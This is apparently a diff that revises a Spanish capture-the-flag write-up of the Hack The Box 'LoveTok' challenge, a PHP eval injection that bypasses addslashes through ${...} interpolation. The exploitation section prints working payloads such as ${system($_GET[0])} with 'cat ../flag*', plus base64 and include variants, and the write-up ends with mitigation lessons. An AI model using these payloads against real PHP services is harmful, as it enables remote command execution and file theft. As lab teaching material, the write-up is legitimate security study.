@@ -4,7 +4,7 @@ type: Web
 difficulty: Easy
 platform: Hack The Box
 state: Retired
-tags: [web, php, code-injection, eval, ssti]
+tags: [web, php, code-injection, eval]
 ---
 
 # LoveTok — Hack The Box
@@ -15,88 +15,71 @@ tags: [web, php, code-injection, eval, ssti]
 
 ## TL;DR
 
-Un servicio que muestra la fecha en distintos formatos recibe el formato por parámetro y lo mete dentro de un `eval`. El `addslashes` de PHP no escapa `${...}` ni las comillas simples anidadas, así que una **inyección de código PHP** con `${system(...)}` ejecuta comandos.
+El controlador recibe `format` por `GET` y lo concatena dentro de un `eval` que llama a `date()`. `addslashes` escapa comillas y barras, pero **no** escapa la interpolación `${...}` de PHP: con `${system($_GET[0])}` se ejecuta un comando y se lee la flag.
 
 ## Enunciado y superficie
 
 ```text
-/TimeController?format=r
+/?format=r
 ```
 
-Devuelve la fecha con formato `r`. Cambiar `format` cambia la salida, lo que ya sugiere concatenación dentro de una función de fecha.
+Devuelve la fecha con formato `r`. El código viene en el reto: `controllers/TimeController.php` y `models/TimeModel.php`.
 
 ## Reconocimiento
 
-- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».
+```bash
+curl -s 'http://<IP>:<PORT>/'
+curl -s 'http://<IP>:<PORT>/?format=Y-m-d'
+```
 
-## Análisis del código
-
-- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».
+Cambiar `format` cambia la salida: la entrada llega a la función de fecha.
 
 ## Explicación del fallo
 
-El controlador es, en esencia:
-
 ```php
-class TimeModel {
-    public function __construct($format) {
-        $this->format = addslashes($format);
-        eval("return date('" . $this->format . "');");
-    }
+public function getTime() {
+    eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
+    return isset($time) ? $time : 'Something went terribly wrong';
 }
 ```
 
-`addslashes` escapa `'`, `"`, `\` y NUL. El payload no usa comillas: usa la **sintaxis `${}`** de PHP, que se interpola dentro de cadenas y evalúa una expresión arbitraria.
-
-## Reproducción local
-
-- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.
+`format` pasa por `addslashes()` (escapa `'`, `"`, `\` y NUL). El payload **no necesita comillas**: PHP interpola `${expresión}` dentro de cadenas dobles y evalúa la expresión, así que la comilla que cierra el `date("` se aporta como `${...}`.
 
 ## Explotación
 
 ```text
-/TimeController?format=${system('cat /flag*')}
+/?format=${system($_GET[0])}&0=ls
 ```
 
-El `eval` final queda:
+`system()` imprime la salida directamente; el valor de `date()` ya da igual. La flag no está en el directorio actual:
 
-```php
-return date('${system('cat /flag*')}');
+```text
+/?format=${system($_GET[0])}&0=cat+../flag*
 ```
-
-`system()` se ejecuta y el valor de retorno de `date()` es irrelevante: la salida del comando ya se ha impreso.
 
 ```text
 HTB{<flag>}
 ```
 
-Variantes útiles si el espacio o las comillas se filtran:
+Alternativas si el espacio o las comillas se filtran:
 
 ```text
-${system($_GET[0])}          # y añadir ?0=cat+/flag*
-${phpinfo()}
-${include('/flag')}
+${system(base64_decode($_GET[0]))}      # y enviar el comando en base64
+${include($_GET[0])}                    # para leer un fichero PHP/texto
 ```
 
 ## Evidencia
 
-- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
-- Los valores reales viven en `private/` y no se publican.
+- Salidas recortadas; sin flags.
+- Los valores reales viven en `private/`.
 
 ## Lecciones aprendidas
 
-- **Comillas simples**: si la app escapa también la barra, `${system($_GET[0])}` evita escribir comillas en el payload.
-- **`eval` con `return`**: la expresión debe ser válida dentro de `date('...')`; `${}` funciona porque se resuelve antes de pasar el string.
-- **URL encoding**: codificar espacios como `+` o `%20` según el cliente.
+- **`addslashes` no es una defensa**: `$`, `{` y `}` siguen pasando.
+- **`${}` en cadenas dobles** es interpolación con evaluación, no concatenación.
+- **La comilla sobra**: cerrar la cadena con `${` evita el filtro y mantiene el código válido.
+- **`../`**: la flag se sirve un nivel arriba del `DocumentRoot`.
 
-- `eval` con entrada del usuario es ejecución remota, aunque el autor crea que solo controla un formato de fecha.
-- `addslashes` no es una defensa: hay que usar una allowlist de caracteres de formato (`Y-m-d H:i:s`).
-- En PHP, `${}` dentro de cadenas dobles es interpolación con evaluación: noche perfecta para inyección.
-
-## Mitigaciones y detección
-
-- No construir plantillas con entrada del usuario; usar sandbox y contexto restringido.
-
-## Referencias
-
-- [ssti](../../knowledge/web/ssti.md)
+- `eval` con entrada del usuario es RCE, aunque el autor crea que sólo controla un formato.
+- Un parámetro que «sólo» elige un formato de fecha merece una allowlist, no un filtro de comillas.
+- Mitigación: `date()` con formatos permitidos (`Y-m-d H:i:s`) y sin `eval`.
